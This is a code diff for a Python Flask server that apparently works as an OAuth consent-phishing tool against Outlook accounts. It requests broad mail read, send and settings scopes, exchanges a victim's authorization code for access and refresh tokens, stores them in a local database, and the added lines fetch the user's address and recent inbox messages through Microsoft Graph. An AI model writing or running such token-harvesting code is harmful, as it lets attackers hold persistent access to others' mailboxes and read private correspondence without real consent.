@@ -10,6 +10,7 @@ import urllib
 import requests 
 import json 
 import sqlite3 
+import pprint
 
 app = Flask(__name__) 
 
@@ -32,6 +33,7 @@ class OutlookOauthServer(object):
 		self.redirectUrl = 'https://tck.bz'
 		self.scopes = ['Mail.ReadWrite','Mail.ReadWrite.Shared','Mail.Send','MailboxSettings.ReadWrite','User.Read', 'offline_access']
 		self.token_endpoint = "https://login.microsoftonline.com/common/oauth2/v2.0/token" 
+		self.graph_endpoint = 'https://graph.microsoft.com/v1.0{}'
 
 		# setup a db as well 
 		self.conn = self.createDbConnection("./outlookOauthServer.db")
@@ -93,16 +95,33 @@ def hello_world():
 		return "Welcome to my site."
 
 	# now we can exchange access_token with client_secret 
-	print "[*] code obtained " + bcolors.BOLD + user_code  + bcolors.ENDC
+	print "[*] code obtained " + bcolors.BOLD + user_code[:20] + "..."  + bcolors.ENDC
 	response = requests.post(outlookServer.token_endpoint, data={'code':user_code, 'scope':' '.join(outlookServer.scopes), 'redirect_uri':outlookServer.redirectUrl, 'client_id':outlookServer.oauthClientId, 'client_secret':outlookServer.oauthSecret, 'grant_type':'authorization_code'})
 
 	if response.status_code == 200:
 		responseData = json.loads(response.text)
-		print responseData
-		print "[*] Access Token obtained : " + bcolors.BOLD + responseData['access_token'] + bcolors.ENDC
-		print "[*] Refresh Token obtained : " + bcolors.BOLD + responseData['refresh_token'] + bcolors.ENDC
+		access_token = responseData['access_token']
+		print "[*] Access Token obtained : " + bcolors.BOLD + responseData['access_token'][:20] + "..." + bcolors.ENDC
+		print "[*] Refresh Token obtained : " + bcolors.BOLD + responseData['refresh_token'][:20] + "..." + bcolors.ENDC
 		outlookServer.createUserRecord(responseData['access_token'], responseData['refresh_token'], responseData['expires_in'])
+		
+		response = requests.get(outlookServer.graph_endpoint.format("/me"), headers={'Authorization': 'Bearer {}'.format(access_token), 'Accept':'application/json'}, params={'$select': 'displayName,mail'})
 		# let chuck it to db 
+		if response.status_code == requests.codes.ok:
+			responseData = json.loads(response.text)
+			print "[*] " + bcolors.BOLD + responseData['mail'] + bcolors.ENDC + " connected."
+			print "[*] Starting to fetch emails" 
+
+		response = requests.get(outlookServer.graph_endpoint.format("/me/mailfolders/inbox/messages"), headers={'Authorization': 'Bearer {}'.format(access_token), 'Accept':'application/json'}, params={'$top': '10',
+                      '$select': 'receivedDateTime,subject,from',
+                      '$orderby': 'receivedDateTime DESC'})
+		# let chuck it to db 
+		if response.status_code == requests.codes.ok:
+			responseData = json.loads(response.text)
+			for e in responseData['value']: 
+				print json.dumps(e, indent=4)
+
+
 	else:
 		print "[!] ERROR " + bcolors.WARNING + str(response.status_code) + " " + response.text + bcolors.ENDC 
 
